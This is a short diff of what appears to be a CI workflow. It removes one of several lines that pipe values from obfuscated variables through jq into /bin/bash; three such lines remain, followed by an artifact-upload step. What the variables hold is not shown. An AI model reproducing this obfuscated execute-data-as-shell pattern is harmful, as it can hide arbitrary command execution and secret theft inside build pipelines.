@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$pgh51" | jq -r .ct72234 | /bin/bash
           echo $bauo5 | jq -r .h5669 | /bin/bash
           echo $tstqo257 | jq -r .tkix9 | /bin/bash
-          printf '%s' "$k6712" | jq -r .pz7 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
